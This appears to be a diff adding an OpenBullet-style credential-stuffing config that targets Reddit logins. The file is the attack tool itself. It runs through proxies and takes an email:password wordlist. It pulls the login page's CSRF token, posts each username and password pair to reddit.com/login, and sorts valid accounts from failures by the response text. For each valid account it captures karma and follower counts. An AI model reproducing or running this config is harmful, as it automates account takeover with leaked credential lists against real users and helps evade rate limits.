@@ -1,0 +1,81 @@
+[SETTINGS]
+{
+  "Name": "redditt",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2021-06-01T09:52:03.0554248+01:00",
+  "AdditionalInfo": "",
+  "RequiredPlugins": [],
+  "Author": "Skip",
+  "Version": "1.1.0 [SB]",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "Default",
+  "AllowedWordlist2": "MailPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "IsBase64": false,
+  "FilterList": [],
+  "EvaluateMathOCR": false,
+  "SecurityProtocol": 0,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "DisableNotifications": false,
+  "DisableImageLoading": false,
+  "DefaultProfileDirectory": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#csrf_token REQUEST GET "https://www.reddit.com/login" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#csrftoken PARSE "<SOURCE>" LR "<input type=\"hidden\" name=\"csrf_token\" value=\"" "\">" -> VAR "csrftoken" 
+
+#login REQUEST POST "https://www.reddit.com/login" 
+  CONTENT "csrf_token=<csrftoken>&otp=&password=<PASS>&dest=https%3A%2F%2Fwww.reddit.com&username=<USER>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36" 
+  HEADER "origin: https://www.reddit.com" 
+  HEADER "referer: https://www.reddit.com/login/" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "{\"dest\": \"https://www.reddit.com\"}" 
+  KEYCHAIN Failure OR 
+    KEY "INCORRECT_USERNAME_PASSWORD" 
+    KEY "incorrect username or password" 
+
+#get REQUEST GET "https://www.reddit.com/user/<USER>" 
+  
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36" 
+  HEADER "origin: https://www.reddit.com" 
+  HEADER "referer: https://www.reddit.com/login/" 
+
+#karma PARSE "<SOURCE>" LR "<span id=\"profile--id-card--highlight-tooltip--karma\" class=\"_1hNyZSklmcC7R_IfCUcXmZ\">" "</span>" CreateEmpty=FALSE -> CAP "karma" 
+
+#followers PARSE "<SOURCE>" LR "</i><span class=\"_1hNyZSklmcC7R_IfCUcXmZ\">" "</span></div>" CreateEmpty=FALSE -> CAP "followers" 
+
+!KEYCHECK BanOnToCheck=FALSE 
+!  KEYCHAIN Success OR 
+!    KEY "<karma>" Contains "<span id=\"profile--id-card--highlight-tooltip--karma\" class=\"_1hNyZSklmcC7R_IfCUcXmZ\">" 
+!    KEY "<followers>" Contains "</i><span class=\"_1hNyZSklmcC7R_IfCUcXmZ\">" 
+
